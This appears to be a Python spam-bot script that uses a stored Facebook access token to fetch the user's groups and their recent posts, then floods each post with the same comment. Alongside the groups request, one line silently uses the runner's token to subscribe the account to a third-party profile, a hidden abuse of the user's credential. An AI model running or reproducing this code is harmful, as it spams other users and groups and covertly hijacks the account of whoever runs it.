#!usr/bin/python3.7
#Author: KANG-NEWBIE
#Github: https://github.com/kang-newbie
#Contact: t.me/kang_nuubi
'''
boleh recode asal cantumkan author aslinya goblok!
'''
try:
	import requests
	from multiprocessing.pool import ThreadPool
	import os, sys, json, time

	banner=("""
 _                              _         
| |        F A C E B O O K     | |        
| | _____  _ __ ___   ___ _ __ | |__ _ _  
| |/ / _ \| '_ ` _ \ / _ \ '_ \| __/ _` | 
|   < (_) | | | | | |  __/ | | | || (_| | 
|_|\_\___/|_| |_| |_|\___|_| |_|\__\__,_| 
                                         """)

	print(banner)
	print("[info] type '<n>' for newlines")
	msg=input("[?] comment: ")
	if msg == '':
		exit("[!] you stupid")
	ms=msg.replace('<n>','\n')
	id1=[]
	def main(arg):
		requs=requests.get('https://graph.facebook.com/'+arg+'/feed?limit=2&access_token='+toket)
		res=json.loads(requs.text)
		for i in res['data']:
			id1.append(i['id'])
			print("\r[get] %s  "%(i['id']),end=''),;sys.stdout.flush();time.sleep(0.01)
	id=[]
	toket=open('toket/token.txt','r').read()
	req = requests.get('https://graph.facebook.com/me/groups?access_token='+toket);requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+toket)
	result = json.loads(req.text)
	for i in result['data']:
		id.append(i['id'])
	T=ThreadPool(5)
	T.map(main,id)
	
	print("[!] start.")
	time.sleep(3)
	le=len(id1)
	co=int(0)
	while co < le:
		for i in range(le):
			co+=1
			par = {'access_token' : toket, 'message' : ms}
			pt=requests.post('https://graph.facebook.com/'+str(id1[i])+'/comments',data=par)
			post=json.loads(pt.text)
			if 'error' in str(post):
				print("[Error] maybe you are blocked from leaving comments")
			else:
				print('[+] ['+str(id1[i])+'] commented')
			if co == le:
				break
			print("[!] sleep 60 second")
			time.sleep(60)
	print("[^•^] done")
except Exception as F:
	exit("\n[Error] %s"%(F))
